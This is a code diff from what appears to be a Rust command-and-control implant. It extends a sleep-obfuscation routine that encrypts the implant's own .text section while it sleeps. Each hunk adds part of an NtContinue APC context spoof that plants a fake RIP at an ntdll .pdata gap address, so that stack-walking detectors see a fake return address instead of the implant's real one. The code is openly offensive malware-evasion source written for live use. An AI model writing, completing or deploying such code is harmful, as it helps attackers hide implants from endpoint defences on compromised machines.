@@ -65,7 +65,12 @@ pub fn sleep(seconds: u32) {
         }
     };
     let key = mask_key_16();
-    let plan = FoliagePlan::build(region.base, region.len, seconds, None, key);
+    // Resolve a spoof RIP from the gap pool for the NtContinue CONTEXT spoof.
+    // If the gap pool is populated, the beacon's thread CONTEXT gets a fake RIP
+    // pointing at a .pdata gap address (looks like a legitimate ntdll leaf to
+    // stack-walking detectors). None = no context spoof during sleep.
+    let spoof_rip = crate::stack::gap_pool_rip();
+    let plan = FoliagePlan::build(region.base, region.len, seconds, spoof_rip, key);
     execute_foliage_plan(&plan);
 }
 
@@ -166,10 +171,14 @@ fn mask_key_16() -> [u8; 16] {
 fn execute_foliage_plan(plan: &FoliagePlan) {
     let secs = plan_seconds(plan);
     let region = unsafe { own_text_region() };
+    // Extract the spoof RIP (None if no gap pool → no context spoof).
+    let spoof_rip = plan.steps.iter().find_map(|s| {
+        if let FoliageStep::SetContext { spoof_rip } = s { Some(*spoof_rip) } else { None }
+    });
 
     // Try the real APC-chain path first. It sets FOLIAGE_APC_OK on success.
     if let Some(r) = &region {
-        if unsafe { execute_foliage_apc(r, &plan.key, secs) } {
+        if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
             return; // full .text mask/unmask cycle completed — done.
         }
         // else: APC path failed → fall through to the data-only floor below.
@@ -228,7 +237,7 @@ pub fn foliage_apc_status() -> u8 {
 ///
 /// # Safety
 /// `region` must be the implant's own `.text`. Single beacon caller.
-unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32) -> bool {
+unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, spoof_rip: Option<u64>) -> bool {
     FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);
 
     // Resolve everything up front; if any primitive is missing, degrade.
@@ -254,6 +263,7 @@ unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32) ->
         secs,
         raw,
         verify: core::ptr::null_mut(),
+        spoof_rip,
     });
     let params_ptr: *mut FoliageParams = Box::into_raw(params);
 
@@ -319,6 +329,8 @@ struct FoliageParams {
     secs: u32,
     raw: FoliageRaw,
     verify: *mut VerifyState,
+    /// Optional spoof RIP for NtContinue CONTEXT (None = no context spoof).
+    spoof_rip: Option<u64>,
 }
 
 /// Bundle of raw export fn-pointers the helper thread uses (resolved once on
@@ -468,14 +480,31 @@ unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
     let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
     nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);
 
-    // 3. Queue a benign APC into the beacon's alertable window. The beacon is
-    //    parked in NtDelayExecution(Alertable=1); this APC (→ apc_noop) wakes
-    //    it / drives it through the encrypted window. apc_noop returns
-    //    immediately and touches no .text. (NtQueueApcThread's 3 args.)
+    // 3. Queue APCs into the beacon's alertable window. The beacon is parked
+    //    in NtDelayExecution(Alertable=1); these APCs wake it / drive it
+    //    through the encrypted window.
     let beacon = raw.nt_current_thread; // beacon's own thread handle (pseudo)
-    let _ = unsafe {
-        raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
-    };
+    if let Some(rip) = p.spoof_rip {
+        // CONTEXT spoof path: queue an NtContinue APC that installs a spoofed
+        // CONTEXT (RIP = gap address) into the beacon thread. When the beacon
+        // wakes + the APC fires, NtContinue restores the spoofed context so a
+        // stack-walking detector sees the gap address, not the implant's real
+        // return address. The spoofed CONTEXT is a leaked 1232-byte buffer with
+        // RIP set to the gap address.
+        let ctx = unsafe { crate::context::spoofed_context(rip) };
+        // NtQueueApcThread(beacon, NtContinue, ctx_ptr, FALSE, 0) — the APC
+        // routine IS NtContinue, so when it fires it calls NtContinue(ctx).
+        let ntc = crate::resolve::export_addr(b"ntdll.dll", b"NtContinue")
+            .unwrap_or(apc_noop as usize);
+        let _ = unsafe {
+            raw.nt_queue_apc_thread(beacon, ntc, ctx as usize, 0, 0)
+        };
+    } else {
+        // No spoof: queue a benign no-op APC just to break the alertable sleep.
+        let _ = unsafe {
+            raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
+        };
+    }
 
     // 4. Sleep the mask window (helper side). .text stays ciphertext here.
     let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
